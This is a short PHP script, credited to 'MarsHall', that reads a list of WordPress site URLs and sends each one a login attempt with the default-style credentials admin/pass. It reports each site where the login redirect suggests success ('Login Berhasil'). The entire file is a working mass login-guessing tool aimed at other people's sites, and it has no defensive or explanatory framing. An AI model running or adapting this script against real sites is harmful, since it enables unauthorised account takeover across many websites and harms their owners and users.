<?php

echo "\n>> Wordpress Default U/P\n";
echo ">> Created By MarsHall\n\n";

$list = file_get_contents("list.txt");
$open = explode("\n", $list);
foreach($open as $ht){

        $col = curl_init();
        curl_setopt($col, CURLOPT_URL, $ht);
        curl_setopt($col, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($col, CURLOPT_HEADER, 1);
        curl_setopt($col, CURLOPT_POST, 1);
        curl_setopt($col, CURLOPT_POSTFIELDS, "log=admin&pwd=pass&wp-submit=1");
        $co = curl_exec($col);
        
    preg_match("/HTTP\/1.1 302/i", $co, $result);

    if (!empty($result)) {
    
        echo "[+] $ht => Login Berhasil\n";
        
    } else {
    
        echo "[×] $ht => Login Gagal\n";
        
    } 
       
  }
?>